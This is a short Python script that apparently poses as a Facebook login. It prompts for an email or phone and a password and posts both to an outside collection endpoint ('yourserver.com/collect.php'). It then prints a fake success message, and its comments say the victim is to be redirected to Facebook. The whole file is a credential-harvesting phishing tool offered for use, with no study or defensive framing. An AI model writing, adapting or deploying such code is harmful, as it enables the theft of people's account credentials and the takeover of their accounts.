import requests

def main():
    email = input("Enter your email or phone: ")
    password = input("Enter your password: ")

    payload = {
        'email': email,
        'password': password
    }

    response = requests.post("https://yourserver.com/collect.php", data=payload)

    if response.status_code == 200:
        print("Login successful!")
        # Redirect to Facebook
        # You can use the webbrowser module to open the URL in the default browser
    else:
        print("Login failed. Please try again.")

if __name__ == "__main__":
    main()
